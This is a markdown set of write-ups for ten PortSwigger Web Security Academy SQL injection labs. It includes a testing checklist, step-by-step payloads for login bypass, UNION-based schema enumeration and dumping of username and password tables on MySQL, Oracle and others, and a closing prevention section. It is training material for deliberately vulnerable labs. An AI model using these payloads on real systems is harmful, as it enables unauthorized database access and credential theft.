# SQL Injection

> PortSwigger Web Security Academy · **10/18** labs completed

SQL injection lets an attacker interfere with the queries an application sends to its database. It can expose data, bypass logins, and in some setups give control of the database server.

[← Back to the index](README.md)

## Contents

- [How to approach this vulnerability](#how-to-approach-this-vulnerability)
- [1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](#1-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data)
- [2. SQL injection vulnerability allowing login bypass](#2-sql-injection-vulnerability-allowing-login-bypass)
- [3. SQL injection attack, querying the database type and version on Oracle](#3-sql-injection-attack-querying-the-database-type-and-version-on-oracle)
- [4. SQL injection attack, querying the database type and version on MySQL and Microsoft](#4-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft)
- [5. SQL injection attack, listing the database contents on non-Oracle databases](#5-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases)
- [6. SQL injection attack, listing the database contents on Oracle](#6-sql-injection-attack-listing-the-database-contents-on-oracle)
- [7. SQL injection UNION attack, determining the number of columns returned by the query](#7-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query)
- [8. SQL injection UNION attack, finding a column containing text](#8-sql-injection-union-attack-finding-a-column-containing-text)
- [9. SQL injection UNION attack, retrieving data from other tables](#9-sql-injection-union-attack-retrieving-data-from-other-tables)
- [10. SQL injection UNION attack, retrieving multiple values in a single column](#10-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column)
- [Prevention](#prevention)

## How to approach this vulnerability

Checklist of things to check when you suspect this class of bug, covering the different ways it shows up:

- Find every point where input reaches a database query: URL params, form fields, cookies, JSON body fields, HTTP headers (User-Agent, X-Forwarded-For), and sort/filter parameters.
- Send a single quote `'`, a backslash, or a boolean pair (`AND 1=1` vs `AND 1=2`) and compare responses, status codes, and timing for a difference.
- If no error is shown, test boolean-based blind (true/false returns different content) and time-based blind (`SLEEP`/`WAITFOR DELAY` causes a delay).
- Identify the database engine from error messages, version functions, or comment syntax (`--`, `#`, `/* */`) and concat operators.
- Find the column count with `ORDER BY n--` or `UNION SELECT NULL,NULL...--`, then find text-type columns to place output in.
- Enumerate schema: `information_schema.tables` / `information_schema.columns` (or `all_tables` / `all_tab_columns` on Oracle, `sqlite_master` on SQLite).
- Check second-order injection: does a value stored now (e.g. a username) get used unsafely in a later query (e.g. password change, admin panel)?
- Check injection in `ORDER BY`, `LIMIT`, column names, or table names, where UNION may not apply and stacked queries or conditional errors are needed instead.
- If UNION and errors are both blocked, confirm out-of-band exfiltration is possible (DNS lookup via `LOAD_FILE`/`UTL_HTTP`/`xp_dirtree`).

## Lab write-ups

### 1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

**Lab:** [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

- In this lab we have to display one or more unlisted products
- To do this we have to modify the category section to '' and add a OR condition with 1=1
- Turn on intercept in proxy and click any category
- The query it is running is ``SELECT * FROM products WHERE category = 'Gifts' AND released = 1``
- Then intercept with proxy and change the category to `'+OR+1=1--` so that it will display the category='' or checks the condition 1=1 and comments every letter after this so it will display all the items
- Now the query has become ``SELECT * FROM products WHERE category = '' OR 1=1-- AND released = 1``
- So the answer is `'+OR+1=1--`

---

### 2. SQL injection vulnerability allowing login bypass

**Lab:** [SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

- Here we have to login as admin
- To do this login using some random username and password like abc and 123
- Intercept with burp and change the username to `administrator'--` and forward the request
- Now you are the admin
- Answer is `administrator'--`

---

### 3. SQL injection attack, querying the database type and version on Oracle

**Lab:** [SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

- In this lab they want me to find the version of the oracle database used
- They have given the cheat sheet for SQLI and there I got the query to find the version
- Then I intercept the site using burp and added the answer: `'+UNION+SELECT+BANNER,NULL+FROM+v$version--`
- The above query means first we will close the current query using `'` and then use union to retrieve data from other database and we add NULL to it because we don't know how many columns it will return so we will have null value for the undesired columns

---

### 4. SQL injection attack, querying the database type and version on MySQL and Microsoft

**Lab:** [SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

- This is as same as the previous lab
- Only change is we need to give a space at the end of the line because MYSQL needs a trailing space
- The answer is `'+UNION+SELECT+@@version,NULL--+`

---

### 5. SQL injection attack, listing the database contents on non-Oracle databases

**Lab:** [SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

- In this lab we are going to combine add the techniques of lab7 and lab8 and add more techniques
- First we need to find the number of columns it has by doing the same technique used in lab7 and we found out that we have 2 columns- `'+UNION+SELECT+NULL,NULL--`
- Next we have to find out which columns has the text by giving some random text using the technique we used in lab 8 and we found out that we have 2 text column- `'+UNION+SELECT+'abcf','sefg'--`
- Then we have to find out the table names in the database using the particular query that we got it from [SQL Injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) - `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
- Then we have to search the tablename which contains users_ and we found out that it is **users_hftfjc**

- Next we have to find the column details of that particular table using a query we got it from  [SQL Injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) - `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_hftfjc'--`

- Now we got the column details of that particular table and the next step will be to print the columns which has the username and password
- To do this we have to run this query- `'+UNION+SELECT+username_ebafvl,+password_yxblmp+FROM+users_hftfjc--`

- Now we got the username and password from the table and it had the password of admin account which is **f1qqjqq4bxc2rp6kij0p**
- Now we login to the admin account

---

### 6. SQL injection attack, listing the database contents on Oracle

**Lab:** [SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

- This is the oracle version of lab5
- The methodology is the same
- I will just add all the queries
- Find the number of columns- we found out it has 2 `'UNION+SELECT+NULL,NULL+FROM+dual--`
- Number of text columns(2)-  `'+UNION+SELECT+'abcf','sefg'+FROM+dual--`
- Find the user table which has the credentials-`'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
- We found the table to be **USERS_ZJJHTN**

- Then we found the columns in the table using this query- `'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ZJJHTN'--`

- Now we got the columns of the table and its time to print the rows of usernames and password using this query- `'+UNION+SELECT+USERNAME_LCMONW,+PASSWORD_TQLQAO+FROM+USERS_ZJJHTN--`
- Now we got the password for the admin account now we are into the admin account

---

### 7. SQL injection UNION attack, determining the number of columns returned by the query

**Lab:** [SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

- In this lab we have to find the number of columns returned by the query
- To do this we are going to use UNION to find it
- Intercept the browser and add this answer:
- `'UNION+SELECT+NULL--`
- If it throws a error then add one more NULL at the end like this- `'UNION+SELECT+NULL,NULL--`
- Do this until you don't get error and the number of NULL is the number of columns
- So the final answer is - `'UNION+SELECT+NULL,NULL,NULL--`

---

### 8. SQL injection UNION attack, finding a column containing text

**Lab:** [SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

- This is the continuation of the previous one and in this lab we are going to find the number of columns containing text
- To do this we are going to replace the given string in the place of any NULL and if it returns the value then that is the answer
- For eg- `'UNION+SELECT+'abcdfefe',NULL,NULL--` - if it returns any non-error answer then that is the column that contains a text
- So the final answer for this is- `'UNION+SELECT+NULL,'abcdefe'--`

---

### 9. SQL injection UNION attack, retrieving data from other tables

**Lab:** [SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

- In this lab they have given the table name which contains the username and password
- First we have to check the number of columns and number of columns with text and we found out there are 2 columns those 2 are texts columns using the following queries:
- `'+UNION+SELECT+NULL,NULL--`
- `'+UNION+SELECT+'abwv','efe'--`
- Then retrieve the username and password of all the user using `'+UNION+SELECT+username,password+FROM+users--`
- Now we got the admin username and password and we logged in as a admin

---

### 10. SQL injection UNION attack, retrieving multiple values in a single column

**Lab:** [SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

- In this lab we the 2 columns username and password will be returned in a single column
- First we need to find the number of columns and then which column is a text
- - `'+UNION+SELECT+NULL,NULL--`
- `'+UNION+SELECT+NULL,'efe'--`
- Then run this query to get the username and password
- `'+UNION+SELECT+NULL,username||password+FROM+users--+`
- Now we got the admin pass

---

## Prevention

How this class of bug is fixed, based on what these labs showed:

- Use parameterized queries (prepared statements) everywhere user input reaches SQL. Never build queries by string concatenation.
- For parts that cannot be parameterized (table names, column names, `ORDER BY`), map the input to a fixed allowlist.
- Run the application with a least-privilege database account, so a successful injection can read and change less.
- Do not show raw database errors to users. Log them server-side instead.
- A WAF is defense in depth only. It does not fix the root cause.
